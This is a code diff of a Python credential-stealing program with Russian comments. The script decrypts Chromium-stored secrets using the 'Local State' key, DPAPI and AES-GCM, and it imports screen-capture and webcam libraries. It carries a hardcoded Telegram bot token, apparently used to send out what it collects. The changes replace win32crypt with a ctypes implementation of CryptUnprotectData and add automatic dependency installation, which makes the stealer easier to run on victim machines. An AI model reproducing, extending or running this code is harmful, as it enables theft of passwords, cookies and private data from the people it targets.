@@ -9,6 +9,9 @@ import tempfile
 import zipfile
 import random
 import time
+import subprocess
+import ctypes
+import ctypes.wintypes
 from datetime import datetime
 from urllib.request import urlopen
 from PIL import ImageGrab
@@ -17,21 +20,75 @@ import base64
 import re
 import cv2
 import sys
+import traceback
 from pathlib import Path
 from Cryptodome.Cipher import AES
-import traceback
 
-# Исправленный импорт для Windows-специфичных модулей
-if platform.system() == "Windows":
+# =============================================
+# АВТОМАТИЧЕСКАЯ УСТАНОВКА ЗАВИСИМОСТЕЙ
+# =============================================
+def install_dependencies():
+    """Устанавливает необходимые зависимости"""
+    required_packages = [
+        'pycryptodomex',
+        'opencv-python',
+        'pillow',
+        'psutil',
+        'python-telegram-bot'
+    ]
+    
     try:
-        import win32crypt
-        HAS_WIN32CRYPT = hasattr(win32crypt, 'CryptUnprotectData')
-    except (ImportError, AttributeError):
-        HAS_WIN32CRYPT = False
-    import winreg
-    import ctypes
-else:
-    HAS_WIN32CRYPT = False
+        # Проверяем, установлен ли уже Cryptodome
+        from Cryptodome.Cipher import AES
+        return  # Библиотеки уже установлены
+    except ImportError:
+        print("Установка необходимых библиотек...")
+        try:
+            for package in required_packages:
+                subprocess.check_call([sys.executable, "-m", "pip", "install", package])
+            print("Библиотеки успешно установлены!")
+        except Exception as e:
+            print(f"Ошибка установки библиотек: {e}")
+            sys.exit(1)
+
+# Вызываем установку зависимостей при первом запуске
+install_dependencies()
+
+# =============================================
+# РЕАЛИЗАЦИЯ CRYPTUNPROTECTDATA ЧЕРЕЗ CTYPES
+# =============================================
+class DATA_BLOB(ctypes.Structure):
+    _fields_ = [
+        ('cbData', ctypes.wintypes.DWORD),
+        ('pbData', ctypes.POINTER(ctypes.c_byte))
+    ]
+
+def crypt_unprotect_data(encrypted_data):
+    """Реализация CryptUnprotectData через ctypes"""
+    buffer = ctypes.create_string_buffer(encrypted_data)
+    blob_in = DATA_BLOB(ctypes.sizeof(buffer), ctypes.cast(ctypes.pointer(buffer), ctypes.POINTER(ctypes.c_byte)))
+    blob_out = DATA_BLOB()
+    
+    # Загружаем библиотеку crypt32.dll
+    crypt32 = ctypes.WinDLL('crypt32.dll')
+    crypt32.CryptUnprotectData.argtypes = [
+        ctypes.POINTER(DATA_BLOB),
+        ctypes.c_wchar_p,
+        ctypes.POINTER(DATA_BLOB),
+        ctypes.c_void_p,
+        ctypes.c_void_p,
+        ctypes.c_uint,
+        ctypes.POINTER(DATA_BLOB)
+    ]
+    crypt32.CryptUnprotectData.restype = ctypes.wintypes.BOOL
+    
+    if crypt32.CryptUnprotectData(ctypes.byref(blob_in), None, None, None, None, 0, ctypes.byref(blob_out)):
+        decrypted_data = ctypes.string_at(blob_out.pbData, blob_out.cbData)
+        crypt32.LocalFree(blob_out.pbData)
+        return decrypted_data
+    else:
+        error_code = ctypes.windll.kernel32.GetLastError()
+        raise RuntimeError(f"CryptUnprotectData failed with error code {error_code}")
 
 # Конфигурация Telegram
 TELEGRAM_BOT_TOKEN = "8081126269:AAH6WKbPLU0Vbg-pZWSSV9wE8d7Nr13pmmo"
@@ -176,16 +233,40 @@ def get_cpu_name():
     """Получает читаемое имя процессора"""
     try:
         if platform.system() == "Windows":
-            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"HARDWARE\DESCRIPTION\System\CentralProcessor\0")
-            cpu_name, _ = winreg.QueryValueEx(key, "ProcessorNameString")
-            cpu_name = cpu_name.strip()
-            cpu_name = re.sub(r'\([^)]*\)', '', cpu_name)
-            cpu_name = re.sub(r'\s+', ' ', cpu_name).strip()
-            if 'GHz' not in cpu_name and 'MHz' not in cpu_name:
-                freq = psutil.cpu_freq().current / 1000 if psutil.cpu_freq() else None
-                if freq:
-                    cpu_name += f" {freq:.2f}GHz"
-            return cpu_name
+            # Используем реестр Windows для получения информации о процессоре
+            try:
+                reg_key = ctypes.windll.advapi32.RegOpenKeyExW(
+                    0x80000002,  # HKEY_LOCAL_MACHINE
+                    r"HARDWARE\DESCRIPTION\System\CentralProcessor\0",
+                    0,
+                    0x20019  # KEY_READ
+                )
+                
+                buf_size = ctypes.wintypes.DWORD(1024)
+                buf = ctypes.create_unicode_buffer(buf_size.value)
+                
+                ctypes.windll.advapi32.RegQueryValueExW(
+                    reg_key,
+                    "ProcessorNameString",
+                    None,
+                    None,
+                    ctypes.byref(buf),
+                    ctypes.byref(buf_size)
+                )
+                
+                ctypes.windll.advapi32.RegCloseKey(reg_key)
+                
+                cpu_name = buf.value.strip()
+                cpu_name = re.sub(r'\([^)]*\)', '', cpu_name)
+                cpu_name = re.sub(r'\s+', ' ', cpu_name).strip()
+                
+                if 'GHz' not in cpu_name and 'MHz' not in cpu_name:
+                    freq = psutil.cpu_freq().current / 1000 if psutil.cpu_freq() else None
+                    if freq:
+                        cpu_name += f" {freq:.2f}GHz"
+                return cpu_name
+            except:
+                pass
         else:
             try:
                 with open('/proc/cpuinfo') as f:
@@ -405,8 +486,8 @@ def get_encryption_key(profile_path):
     """Получает ключ шифрования с поиском Local State в родительской папке"""
     debug_log(f"Поиск ключа для: {profile_path}")
     
-    if platform.system() != "Windows" or not HAS_WIN32CRYPT:
-        debug_log("Платформа не Windows или win32crypt недоступен")
+    if platform.system() != "Windows":
+        debug_log("Платформа не Windows, ключ не может быть получен")
         return None
     
     # Поиск Local State в возможных расположениях
@@ -445,11 +526,11 @@ def get_encryption_key(profile_path):
             
         encrypted_key = encrypted_key[5:]  # Удалить префикс DPAPI
         try:
-            key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+            key = crypt_unprotect_data(encrypted_key)
             debug_log(f"Ключ успешно получен ({len(key)} байт)")
             return key
         except Exception as e:
-            debug_log(f"Ошибка в win32crypt.CryptUnprotectData: {e}")
+            debug_log(f"Ошибка в crypt_unprotect_data: {e}")
             return None
     except Exception as e:
         debug_log(f"Ошибка получения ключа {profile_path}: {e}")
@@ -471,9 +552,9 @@ def decrypt_chromium_value(encrypted_value, key):
             return encrypted_value
         
         # Для Windows: попробовать DPAPI
-        if platform.system() == "Windows" and HAS_WIN32CRYPT:
+        if platform.system() == "Windows":
             try:
-                decrypted = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1]
+                decrypted = crypt_unprotect_data(encrypted_value)
                 if decrypted:
                     try:
                         result = decrypted.decode('utf-8')
@@ -491,7 +572,7 @@ def decrypt_chromium_value(encrypted_value, key):
             debug_log("Ключ дешифровки отсутствует")
             return base64.b64encode(encrypted_value).decode('utf-8')
         
-        # Обработка AES-GCM (v10/v11)
+        # Обработка AES-GCM (v10/v11) - КЛЮЧЕВОЕ ИСПРАВЛЕНИЕ
         if len(encrypted_value) > 15 and encrypted_value.startswith(b'v10'):
             debug_log("Обнаружен формат v10 (AES-GCM)")
             try:
@@ -499,7 +580,7 @@ def decrypt_chromium_value(encrypted_value, key):
                 ciphertext = encrypted_value[15:-16]
                 tag = encrypted_value[-16:]
                 
-                debug_log(f"Данные GCM: nonce={len(nonce)} ciphertext={len(ciphertext)} tag={len(tag)}")
+                debug_log(f"Данные GCM: nonce={nonce.hex()[:12]}... ciphertext={len(ciphertext)} tag={tag.hex()[:12]}...")
                 
                 cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
                 plaintext = cipher.decrypt_and_verify(ciphertext, tag)
@@ -554,9 +635,9 @@ def decrypt_chromium_value(encrypted_value, key):
                 debug_log(f"Ошибка CBC: {str(e)}")
         
         # Последняя попытка: DPAPI для Windows
-        if platform.system() == "Windows" and HAS_WIN32CRYPT:
+        if platform.system() == "Windows":
             try:
-                decrypted = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1]
+                decrypted = crypt_unprotect_data(encrypted_value)
                 if decrypted:
                     try:
                         return decrypted.decode('utf-8')
